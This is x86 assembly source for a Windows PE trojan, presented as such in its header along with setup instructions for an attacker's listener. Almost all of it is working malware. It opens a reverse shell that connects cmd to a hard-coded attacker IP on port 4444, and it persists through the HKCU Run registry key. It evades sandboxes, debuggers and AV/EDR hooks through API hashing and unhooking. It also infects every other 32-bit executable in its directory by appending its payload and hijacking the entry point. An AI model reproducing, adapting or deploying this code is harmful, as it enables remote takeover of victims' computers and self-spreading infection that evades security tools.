;-------------------------------------------------------------------------------------------------------------------------------------;
; Author: Bach Ngoc Hung (hung.bachngoc@gmail.com)
; Compatible: Windows PE file 32 bits
; Note: Setup the listener on port 4444 and change the ip address of the attack machine in the code first
; Version: 3.0
; This trojan is capable of:
;	[+] Create backdoor and start reverse shell for remote execution
;	[+] Add itself to the registry for persistence
; 	[+] Detect sandbox and debugger and alter its behaviour
;	[+] Infect all 32 bit exe files in the directory, infected files can do the same while continuing to function normally
;	[+] Unhooking API to bypass AVs/EDRs
;	[+] Hide API through hashing
; This program uses API hashing to get function addresses, referenced from Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com).
; Size: 1299 bytes
;-------------------------------------------------------------------------------------------------------------------------------------;

.386
Option CaseMap:None

.Code
start:
payload:
	Jmp get_payload_addr

get_eip:
	Pop Ebx
	Jmp next

get_payload_addr:
	Call get_eip

next:
	Xor Ecx, Ecx
	delta = $ -payload
	Sub Bl, delta					; Point ebx back to the entry point of the payload
	Add Bl, 2H
	Mov Ch, 4H					; Allocate the buffer size on the stack (0x400)
	Sub Esp, Ecx
	Jmp check

hash_api:
	Pushad						; save all registers
	Mov Ebp, Esp
	Xor Esi, Esi
	Mov Edx, [Fs:30H + Esi]				; PEB
	Mov Edx, [Edx + 0CH]				; PEB_LDR_DATA
	Mov Edx, [Edx + 14H]				; First module in InMemoryOrderModuleList

next_module:
	Mov Esi, [Edx + 28H]				; Move pointer to module's name
	Movzx Ecx, Word Ptr [Edx + 26H]			; Set counter = length of the module name
	Xor Edi, Edi

calculate_hash:
	Xor Eax, Eax
	Lodsb						; Load the name of the module to eax
	Cmp Al, 61H					; Check for the lowercase ('a' is 0x61 in hex)
	Jl uppercase					; Jump if uppercase
	Sub Al, 20H					; convert to uppercase

uppercase:
	Ror Edi, 0DH					; Rotate right by 13 bits
	Add Edi, Eax					; Add the next byte of the name
	Dec Ecx
	Jnz calculate_hash
	Push Edx					; Push the current module to the stack for later use
	Push Edi					; The hash value is stored in edi

	; Iterate through the export address table
	Mov Edx, [Edx + 10H]				; Base address of the current module
	Mov Eax, [Edx + 3CH]
	Add Eax, Edx					; PE signature

	Mov Eax, [Eax + 78H]
	Test Eax, Eax					; Check to see if the export table is present or not
	Jz get_next_module				; If no, then proceed to the next module

	Add Eax, Edx					; Address of Export Table
	Push Eax					; Save the address of Export Table for later use

	Mov Ecx, [Eax + 18H]				; Set counter = number of exported function names
	Mov Ebx, [Eax + 20H]				; Get address of name table
	Add Ebx, Edx					; ebx = Address of name table

	; Hash module and function name
	; and compare it with the hash that we are searching for
get_next_function:
	Test Ecx, Ecx
	Jz jump_next_module				; If no exported function left => jump to next module
	Dec Ecx
	Mov Esi, [Ebx + Ecx * 4]			; RVA of next function name
	Add Esi, Edx
	Xor Edi, Edi

loop_funcname:
	Xor Eax, Eax
	Lodsb						; Load the name of the function to eax
	Ror Edi, 0DH					; Rotate right by 13 bits
	Add Edi, Eax					; Add the next byte of the name
	Cmp Al, Ah					; Compare Al (next byte from the name) with the AH (null terminator)
	Jne loop_funcname
	Add Edi, [Ebp - 8H]				; Add the module hash with function hash
	Cmp Edi, [Ebp + 24H]				; Compare it with the hash that we are searching for
	Jnz get_next_function				; Move on and hash the next function if the hash is not identical

	; If the desired hased function is found then get its address
	Pop Eax						; Restore the address of Export Table
	Mov Ebx, [Eax + 24H]				; Get the RVA of the ordinal table
	Add Ebx, Edx
	Mov Cx, [Ebx + 2 * Ecx]				; Get the function ordinal
	Mov Ebx, [Eax + 1CH]
	Add Ebx, Edx					; Get the address of the address function table
	Mov Eax, [Ebx + 4 * Ecx]
	Add Eax, Edx					; This is the address of the function that we are looking for
	Mov [Esp + 24H], Eax				; Save the address

	; Fix up the stack and jump to the desired function
	Pop Ebx						; Clear the current modules hash
	Pop Ebx						; Clear the current position in the module list
	Popad
	Pop Ecx
	Pop Edx
	Push Ecx
	Mov Edx, [Ebp - 20H]				; Check the unhook required flag
	Cmp Dl, 1					; If the flag is true
	Je hooked_func_addr				; Then jump to this to get the address of the desired function only
	Jmp Eax						; If not then execute function

hooked_func_addr:
	Xor Edx, Edx
	Mov [Ebp - 20H], Edx				; Clear the flag
	Ret						; Return to the original execution flow

; If the current module is not the desired one then jump here
jump_next_module:
	Pop Edi						; Pop off the export address table in the current module

get_next_module:
	Pop Edi						; Pop off the current module hash
	Pop Edx						; Restore the current position in the module list
	Mov Edx, [Edx]					; Go to the next module
	Jmp next_module

exit:
	Push Ebx					; 0
	Push 56A2B5F0H					; hash("kernel32.dll", "ExitProcess")
	Call hash_api

exit_success:
	Xor Esi, Esi
	Mov Edx, [Fs:30H + Esi]				; PEB
	Mov Edx, [Edx + 0CH]				; PEB_LDR_DATA
	Mov Edx, [Edx + 14H]				; First module in InMemoryOrderModuleList
	Mov Edi, [Edx + 10H]				; Base address of the current executable

	Mov Eax, [Edi + 34H]				; Load jump back entry point to eax
	Test Eax, Eax					; If nothing is written there => exit
	Je exit
	Push Eax
	Ret

check:
	Lea Eax, [Ebp - 250H]
	Push Eax
	Push 4B2B9D76H					; hash("kernel32.dll", "GetSystemInfo")
	Call hash_api

	Mov Eax, [Ebp - 250H + 14H]
	Cmp Eax, 4					; If number of CPU cores < 4 then it most likely VM or sandboxes
	Jl exit_success					; exit

	Push 0C6643248H					; hash("kernel32.dll, "IsDebuggerPresent")
	Call hash_api
	Test Al, Al					; Check if the flag is true or not
	Jnz exit_success

unhook_api:
	; For demo, only CreateProcessA will get unhooked only
	; Get handle of the current process
	Push 51E2F352H					; hash("kernel32.dll", "GetCurrentProcess")
	Call hash_api
	Xchg Eax, Edi

	Mov Al, 1
	Mov [Ebp - 20H], Al				; Set flag for the function that needs to be unhooked
	Push 863FCC79H					; hash("kernel32.dll", "CreateProcessA")
	Call hash_api

	Mov Dx, 5DECH
	Push Edx
	Push 8B55FF8BH					; "\x8B\xFF\x55\x8B\xEC\x5D" first 6 bytes of CreateProcessA
	Mov Esi, Esp					; Pointer to the bytes string

	; Unhook CreateProcessA
	Xor Ecx, Ecx
	Push Ecx					; lpNumberOfBytesWritten = NULL
	Mov Cl, 6H
	Push Ecx					; nSize
	Push Esi					; lpBuffer
	Push Eax					; CreateProcessA base address
	Push Edi					; hProcess = GetCurrentProcess() handle
	Push 0E7BDD8C5H					; hash("kernel32.dll", "WriteProcessMemory")
	Call hash_api

reverse_shell:
	Mov [Ebp - 108H], Ebx				; This holds the address of the beginning of the payload

	; Load ws2_32.dll library
	Mov Ax, 3233H
	Push Eax
	Push 5F327377H
	Push Esp
	Push 0726774CH 					; hash('kernel32.dll', 'LoadLibraryA')
	Call hash_api

	; System call: WSAStartup
	Xor Ecx, Ecx
	Mov Cx, 190H
	Sub Esp, Ecx					; Creating space for WSAData
	Push Esp					; lpWSAData
	Push Ecx
	Push 6B8029H					; hash('ws2_32.dll', 'WSAStartup')
	Call hash_api

	; System call: WSASocketA
	Push Eax					; dwFlags = NULL
	Push Eax					; g = NULL
	Push Eax					; lpProtocolInfo = NULL
	Push Eax					; protocol = NULL
	Inc Eax
	Push Eax					; type = 1 (SOCKSTREAM)
	Inc Eax
	Push Eax					; af = 2 (AFINET)
	Push 0E0DF0FEAH					; hash('ws2_32.dll', 'WSASocketA')
	Call hash_api
	Xchg Eax, Edi					; WSASocketA() Handler

	; Sytem call: connect
	; connect(SOCKET s, const addr *name, int namelen)
	; listen on port 4444 (0x5C11), IPv4 set to AF_INET (0x0002) => 5C110002
	; listen on all interfaces
	Push 0DE64A8C0H 					; 192.168.100.222
	Mov Eax, 5C110102H
	Dec Ah						; 5C110102 => 5C110002 (Remove 01)
	Push Eax					; namelen 
	Push Esp					; *name: 5C110002
	Push Edi					; Arg 1(s): WSASocketA() Handler
	Push 6174A599H					; hash("ws2_32.dll", "connect")
	Call hash_api

	; CreateProcessA
	Push 61646D63H
	Sub DWord Ptr [Esp + 3H], 61H
	Mov Edx, Esp					; edx = pointer to "cmd"

	; STARTUPINFO struct
	Push Edi					; SetStdInput to WSASocketA() handler
	Push Edi					; SetStdOutput to WSASocketA() handler
	Push Edi					; SetStdError to WSASocketA() handler
	Push 12H					; 18
	Pop Ecx

zero_mem_struct:
	Push Eax					; NULL
	Loop zero_mem_struct				; Push 0x00000000 18 times
	Mov Word Ptr [Esp + 3CH], 101H			; dwFlag (60 bytes from the top of the stack)
	Mov Byte Ptr [Esp + 10H], 44H
	Lea Edi, [Esp + 10H]

	; Calling CreateProcessA
	Push Esp					; Pointer to PROCESS_INFORMATION structure
	Push Edi					; Pointer to STARUPINFOA structure
	Push Eax
	Push Eax
	Push Eax
	Inc Eax
	Push Eax					; bInheritAttributes = True
	Dec Eax
	Push Eax					; lpThreadAttributes = False
	Push Eax					; lpProcessAttributes
	Push Edx					; Pointer to cmdline
	Push Eax					; lpApplicationName
	Push 863FCC79H					; hash("kernel32.dll", "CreateProcessA")
	Call hash_api					; CreateProcessA

	; Calling WaitForSingleObject
	Xor Edx, Edx
	Mov Eax, Esp					; eax = pointer to PROCESS_INFORMATION structure
	Push Edx					; dwMiliseconds = 0
	Push DWord Ptr [Eax]
	Push 601D8708H					; hash("kernel32.dll", "WaitForSingleObject")
	Call hash_api

SetRegistryKey:
	; Load Advapi32.dll
	Xor Edx, Edx
	Push Edx
	Push 32336970H
	Push 61766441H
	Push Esp
	Push 0726774CH 					; hash("kernel32.dll", "LoadLibraryA")
	Call hash_api

	Mov Cl, 6EH
	Push Ecx
	Push 75525C6EH
	Push 6F697372H
	Push 6556746EH
	Push 65727275H
	Push 435C7377H
	Push 6F646E69H
	Push 575C7466H
	Push 6F736F72H
	Push 63694D5CH
	Push 65726177H
	Push 74666F53H
	Mov Edx, Esp					; edx = Pointer to "Software\Microsoft\Windows\CurrentVersion\Run"
	Xor Ecx, Ecx

	; Set hKey with RegOpenKeyExA
	Lea Eax, [Ebp - 10H]
	Push Eax					; phkResult
	Push 2H						; samDesired = KEY_SET_VALUE
	Push Ecx					; ulOptions = NULL
	Push Edx					; lpSubkey
	Mov Ch, 80H
	Shl Ecx, 16
	Mov Cl, 1H					; ecx = 0x80000001
	Push Ecx					; hKey = HKEY_CURRENT_USER
	Push 3E9E3F88H					; hash ("Advapi32.dll", 'RegOpenKeyExA')
	Call hash_api
	Mov Edi, [Ebp - 10H]

	; Retrieve the path of the current process
	Xor Ecx, Ecx
	Push Ecx
	Mov Cx, 104H
	Push Ecx					; nSize = 260 bytes
	Lea Esi, [Ebp - 200H]
	Push Esi					; lpFileName
	Push Eax					; hModule = NULL
	Push 0FE61445DH
	Call hash_api					; Call GetModuleFileNameA

	Push Esi					; Pointer to buffer that stores exe path
	Push 0CC8E00F4H
	Call hash_api					; Call lstrlenA

	Xor Ecx, Ecx
	Push Ecx					; NULL
	Push 74696873H					; "shit"
	Mov Edx, Esp					; ebx = Pointer to "shit" string

	; RegSetValueExA
	Push Eax					; cbData
	Lea Eax, [Ebp - 200H]				; Pointer to buffer that stores exe path
	Push Eax
	Inc Ecx
	Push Ecx					; dwType = REG_SZ
	Dec Ecx
	Push Ecx					; Reserved
	Push Edx					; lpValueName
	Push Edi					; hKey
	Push 0B97A6615H
	Call hash_api					; Call RegSetValueExA

	Push Edi
	Push 81C2AC44H
	Call hash_api					; Call RegCloseKey
	Lea Edi, [Ebp - 150H]

; Copy the path from [ebp - 200H] to [ebp - 150H]
copy_loop:
	Lodsb
	Stosb
	Test Al, Al
	Jnz copy_loop

	Call find_last_backslash			; Remove the last backslash to get the directory from the path
	Lea Ebx, [Ebp - 200H]
	Push Ebx					; lpString2
	Lea Edx, [Ebp - 300H]
	Push Edx					; lpString1
	Push 0E28D73B4H					; hash ("kernel32.dll", "lstrcpyA")
	Call hash_api

	; Find all exe files in the directory
	Lea Ebx, [Ebp - 300H]
	Push Ebx
	Push 0CC8E00F4H					; hash ("kernel32.dll", "lstrlenA")
	Call hash_api

	Add Ebx, Eax
	Mov DWord Ptr [Ebx], 78652E2AH			; "*.ex"
	Mov Word Ptr [Ebx + 4H], 065H			; "e"

	Lea Eax, [Ebp - 400H]
	Push Eax
	Lea Eax, [Ebp - 300H]
	Push Eax					; "Path\To\CurrentDirectory\*.exe"
	Push 95DA3590H					; hash("kernel32.dll", "FindFirstFileA")
	Call hash_api
	Mov [Ebp - 48H], Eax				; Save FindFirstFileA handle for later use

process_files_loop:
	; Cut the name of the exe file returned from FindFirstFileA
	; And append it to the current directory using lstrcatA => path to the exe file
	Lea Eax, [Ebp - 400H + 2CH]			; cFileName
	Push Eax					; [in] lpString2 : Name of the exe file
	Lea Eax, [Ebp - 200H]
	Push Eax					; [in, out] lpString1 : This will hold the address of the file for injection
	Push 0C48D7274H					; hash ("kernel32.dll", "lstrcatA")
	Call hash_api

	; Compare the constructed path with the current process path
	Lea Eax, [Ebp - 200H]				; Path to the target exe
	Push Eax
	Lea Eax, [Ebp - 150H]				; Path of the running process
	Push Eax
	Push 0DC8D7174H					; hash("kernel32.dll", "lstrcmpA")
	Call hash_api

	; If identical, skip to next file
	Test Eax, Eax
	Je infect_next_file

	; If not identical, proceed with injecting
	Jmp InjectingFile

infect_next_file:
	; Move on to the next exe file
	Call find_last_backslash			; Remove the last backslash to get the directory from the path
	Mov Edi, [Ebp - 48H]				; Load FindFirstFileA handle to edi
	Lea Eax, [Ebp - 400H]
	Push Eax					; LPWIN32_FIND_DATAA
	Push Edi					; FindFirstFileA handle
	Push 0F76C45E7H					; hash("kernel32.dll", "FindNextFileA")
	Call hash_api

	; Check if there are more files to process
	Test Eax, Eax
	Jne process_files_loop

	; No more file, jump to success
	Jmp exit_success

find_last_backslash:
	; Find the last backslash in the path and null-terminate the string
	Lea Ebx, [Ebp - 200H]
	Push Ebx					; Path to the current exe
	Push 0CC8E00F4H					; hash("kernel32.dll", "lstrlenA")
	Call hash_api					; Size of the path => eax
	Add Ebx, Eax               			; Point edx to the end of the string
	Dec Ebx

find_backslash_loop:
	Cmp Byte Ptr [Ebx], 5CH     			; 5C = "\"
	Je found_backslash				; If found then jump to next step
	Dec Ebx						; Else, keep decreasing until the "\" is found
	Jmp find_backslash_loop				; Loop

found_backslash:
	Mov Byte Ptr [Ebx + 1H], 0H 			; Null-terminate the string at the last backslash
	Ret

InjectingFile:
	Xor Ecx, Ecx
	Lea Eax, [Ebp - 200H]
	Push Ecx					; hTemplatefile (NULL)
	Push Ecx					; dwFlagsAndAttributes (NULL)
	Push 3H						; dwCreationDisposition (OPEN_EXISTING)
	Push Ecx					; lpSecurityAttributes (NULL)
	Push 1H						; dwShareMode (FILE_SHARE_READ)
	Mov Ch, 0C0H
	Shl Ecx, 16					; ecx = 0x0C0000000
	Push Ecx					; dwDesiredAccess (GENERIC_WRITE or GENERIC_READ)
	Push Eax					; lpFilePath
	Push 4FDAF6DAH					; hash("kernel32.dll", "CreateFileA")
	Call hash_api
	Cmp Eax, 0FFFFFFFFH				; Check if handle is valid

	Je infect_next_file					; If the handle is invalid => infect the next file
	Mov [Ebp - 4CH], Eax				; Store the file handle

	Xor Edx, Edx
	Push Edx					; NULL
	Push Edx					; 0
	Push Edx					; 0
	Push 4H						; PAGE_READWRITE
	Push Edx					; lpFileMappingAttributes = 0
	Push Eax					; fileHandle
	Push 23F9CD0AH					; hash("kernel32.dll", "CreateFileMappingA")
	Call hash_api

	; Check if mapping handle is valid
	Cmp Eax, Ecx
	Je exit
	Mov [Ebp - 50H], Eax				; Store mapping handle
	Mov Ecx, Eax

	; Get the address of the mapped file
	Xor Ebx, Ebx
	Push Ebx
	Push Ebx
	Push Ebx
	Push 2H						; dwDesiredAccess = FILE_MAP_WRITE
	Push Ecx
	Push 757AEF13H					; hash("kernel32.dll", "MapViewOfFile")
	Call hash_api

	; Check if mapping address is valid
	Cmp Eax, Ebx
	Je exit
	Mov Ebx, Eax					; Base address of the infected file
	Mov [Ebp - 58H], Eax				; Save the base address

	Mov Eax, [Eax + 34H]
	Test Eax, Eax					; Checking if the file has been infected or not
	Jnz infect_next_file				; If it's infected, move to next file

	Mov Edi, [Ebx + 3CH]
	Add Edi, Ebx					; PE signature

	Mov Eax, [Edi + 4H]		
	Cmp Ax, 14CH					; Check if the file is 32 bit executable or not
	Jne infect_next_file

	Mov Eax, [Edi + 3CH]
	Mov [Ebp - 64H], Eax				; FileAlignment

	Mov Eax, [Edi + 38H]
	Mov [Ebp - 68H], Eax				; SectionAlignment

	Mov Eax, [Edi + 28H]				; AddressOfEntryPoint
	Mov Edx, [Edi + 34H]				; ImageBase
	Add Eax, Edx					; Jump back entry point

	Mov [Ebx + 34H], Eax				; Tell the injected file where the jump back entry point is

	Mov Eax, [Edi + 50H]
	Mov [Ebx + 30H], Eax				; Save SizeOfImage for backup later
	Mov [Ebp - 60H], Eax				; SizeOfImage

	Mov Ax, [Edi + 6H]				; Number of section
	Mov Cl, 0F8H
	Movzx Ecx, Cl
	Add Edi, Ecx					; Skip through Optional Header
	Dec Ax
	Mov Dl, 40
	IMul Dl
	Movzx Eax, Ax
	Add Edi, Eax					; Move to the last section info in section table
	Push Edi					; Save the current position in the section table for later use

	; Calculate new virtual size of the last section
	; and distance to move to inject the payload
	Mov Eax, [Edi + 8H]				; Move to the last section virtual size
	Mov [Ebx + 2CH], Eax				; Save virtual size for backup later
	Mov Edx, [Edi + 14H]				; Move to last section raw address
	Add Edx, Eax
	Mov [Ebp - 70H], Edx				; Save the distance to move for the payload injection

	Mov Cx, PayloadSize
	Add Eax, Ecx
	Mov [Edi + 8H], Eax
	Push Eax					; Save new virtual size
	Mov Esi, [Ebp - 4CH]				; esi = fileHandle

	; Calculate new raw size of the last section
	Mov Eax, [Edi + 10H]				; Move to last section raw size
	Mov [Ebx + 38H], Eax				; Save RawSize for backup later
	Add Eax, Ecx
	Mov Ecx, [Ebp - 64H]				; FileAlignment
	Dec Ecx
	Add Eax, Ecx
	Not Ecx
	And Eax, Ecx
	Mov [Edi + 10H], Eax				; Update new raw size of the last section

	Mov Eax, [Edi + 24H]
	Mov [Ebx + 28H], Eax				; Save the current Characteristics for backup later
	Mov Bh, 60H
	Shl Ebx, 16
	Mov Bl, 20H
	Or Eax, Ebx					; IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE
	Mov [Edi + 24H], Eax				; Update last section characteristics

	; Calculate new AddressOfEntryPoint = VirtualAddress + VirtualSize - PayloadSize
	Mov Eax, [Edi + 0CH]				; VirtualAdress
	Pop Ecx						; VirtualSize
	Add Eax, Ecx
	Mov Cx, PayloadSize
	Sub Eax, Ecx

	Mov Edi, [Ebp - 58H]				; Base address
	Add Edi, [Edi + 3CH]				; Move back to PE signature
	Mov [Edi + 28H], Eax				; Update new AddressOfEntryPoint

	; Calculate new SizeOfImage and roundit up with section alignment
	Mov Eax, [Edi + 50H]				; eax = offset of SectionAlignment
	Dec Eax
	Add Ecx, Eax
	Not Eax
	And Ecx, Eax
	Mov Eax, [Ebp - 60H]				; eax = SizeOfImage
	Add Ecx, Eax
	Mov [Edi + 50H], Ecx				; Update new SizeOfImage

	; Turn off DLL can move flag
	Mov Eax, [Edi + 5EH]
	Xor Ecx, Ecx
	Mov Cl, 40H					; IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
	Not Ecx
	And Eax, Ecx					; Clear the flag
	Mov [Edi + 5EH], Eax
	Pop Edi						; Restore the current position in the section table

	; Injecting the payload
	Mov Edx, [Ebp - 70H]				; Load distance to move to edx
	Xor Ebx, Ebx
	Push Ebx					; FILE_BEGIN
	Push Ebx					; NULL
	Push Edx
	Push Esi					; FileHandle
	Push 0D812CDAAH					; hash("kernel32.dll", "SetFilePointer")
	Call hash_api

	Lea Eax, [Ebp - 6CH]
	Push Ebx					; lpOverlapped = NULL
	Push Eax					; lpNumberOfBytesWritten
	Xor Eax, Eax
	Mov Ax, PayloadSize
	Push Eax
	Mov Edx, [Ebp - 108H]				; Load payload base address to edx
	Lea Eax, [Edx]					; Point eax to the beginning of the payload
	Push Eax					; lpBuffer
	Push Esi					; FileHandle
	Push 5BAE572DH					; hash("kernel32.dll", "WriteFile")
	Call hash_api

	; Set end of file
	Mov Eax, [Edi + 10H]				; Move to the last section raw size
	Mov Edx, [Edi + 14H]				; Move to last section raw address
	Add Edx, Eax
	Push Ebx					; FILE_BEGIN
	Push Ebx					; NULL
	Push Edx
	Push Esi					; FileHandle
	Push 0D812CDAAH					; hash("kernel32.dll", "SetFilePointer")
	Call hash_api

	Push Esi					; FileHandle
	Push 0D7E3CBDBH					; hash("kernel32.dll", SetEndOfFile")
	Call hash_api					; Call SetEndOfFile
	Jmp infect_next_file

PayloadSize = $ -payload

End start
